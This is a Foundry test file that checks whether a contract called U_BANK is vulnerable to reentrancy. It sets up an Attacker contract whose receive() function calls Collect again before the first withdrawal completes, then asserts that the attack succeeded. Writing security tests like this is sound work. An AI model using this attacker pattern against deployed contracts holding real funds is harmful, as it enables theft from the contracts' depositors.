
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/U_BANK.sol";

contract TestReentrancyU_BANK is Test {

    U_BANK public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        address logAddress = address(new Log(address(0)));
        _contractUnderTest = new U_BANK(logAddress);
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 2 ether);
        vm.assume(attackVal <= type(uint128).max);

        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _contractUnderTest.Put{value: attackVal}(block.timestamp + 1);
        vm.warp(block.timestamp + 2);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    U_BANK public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public attackValue;

    constructor(address victimAddress) {
        victim = U_BANK(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        attackValue = val;
    }

    function attack(uint256 val) public {
        initialSnapshot = victim.Acc(address(this)).balance;
        victim.Collect{value: 0}(val);

        if (attackCallCount == 2) {
            exploitSucceeded = (victim.Acc(address(this)).balance > initialSnapshot);
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            victim.Collect{value: 0}(attackValue);
            attackCallCount++;
        }
    }
}
